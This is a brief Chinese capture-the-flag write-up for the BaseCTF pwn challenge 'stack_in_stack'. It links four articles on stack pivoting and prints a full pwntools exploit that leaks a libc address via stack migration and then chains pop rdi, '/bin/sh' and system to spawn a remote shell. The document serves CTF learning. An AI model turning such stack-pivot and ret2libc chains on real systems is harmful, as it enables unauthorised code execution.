# Basectf pwn方向“stack_in_stack”

by Maple

栈迁移+libc，我理解的也不是很深刻，就不讲解了，这里附几篇我认为讲的不错的帖子

[栈迁移原理深入理解以及实操](https://xz.aliyun.com/t/12738?time__1311=GqGxu7G%3DGQD%3DoGN4eeqBKwpb8ddY5fII3x)

[栈迁移的原理&&实战运用](https://www.cnblogs.com/ZIKH26/articles/15817337.html)

[栈迁移原理介绍和运用](https://www.cnblogs.com/max1z/p/15299000.html)

[[原创]钉子户的迁徙之路（一）](https://bbs.kanxue.com/thread-281631.htm)


```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#p = process("./pwn")
p = remote('gz.imxbt.cn',20330)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

p.recvuntil(b'mick0960.\n')
buf_addr = int(p.recv(14),16)
log.info("buf_addr:"+hex(buf_addr))

seceret = 0x4011dd
main = 0x40124a
leave = 0x00000000004012f2
ret = 0x000000000040101a

#泄露libc基地址
payload = p64(0) + p64(seceret) + p64(0) + p64(main)
payload += p64(0) + p64(0) #填充到rbp，0x30也就是48个字节减去前面的4*8,再填充两个
payload += p64(buf_addr) + p64(leave)#栈迁移，先覆盖返回地址为buf，再接leave_ret
p.send(payload)

p.recvuntil(b'0x')
libc_base = int(p.recv(12),16)-libc.sym["puts"]
log.info("libc_base:"+hex(libc_base))

# 重新接受buf
p.recvuntil(b'mick0960.\n')
buf_addr = int(p.recv(14),16)
log.info("buf_addr:"+hex(buf_addr))

system_addr = libc_base+libc.sym["system"]
binsh = libc_base+next(libc.search(b'/bin/sh'))
pop_rdi = libc_base+0x2a3e5

payload = p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)
payload+=p64(0) # 填充一个
payload+=p64(buf_addr)+p64(leave)
p.send(payload)

p.interactive()
```